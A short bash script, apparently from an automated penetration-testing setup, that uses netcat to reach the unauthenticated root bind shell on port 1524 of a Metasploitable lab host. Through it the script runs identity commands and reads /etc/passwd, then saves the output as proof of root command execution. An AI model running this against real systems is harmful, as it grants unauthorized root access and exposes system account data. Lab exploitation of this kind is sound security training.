#!/usr/bin/env bash
# Metasploitable: TCP 1524 (ingreslock) is an UNAUTHENTICATED root bind shell.
# We connect with netcat and run read-only commands to prove root RCE. No creds,
# no exploit code — just connect and type. Read-only only (id/uname/passwd).
set -uo pipefail
OUT="/opt/argus-ai/gemini-scans/metasploitable/02-root1524.txt"
{
  echo "### Metasploitable TCP 1524 (ingreslock) — unauthenticated root bind shell ###"
  echo "### Sent over a raw netcat connection; whatever answers runs our commands. ###"
  echo
  printf 'id\nwhoami\nuname -a\nhostname\nhead -n 20 /etc/passwd\nexit\n' \
    | nc -w 5 target-m 1524
} 2>&1 | tee "$OUT"
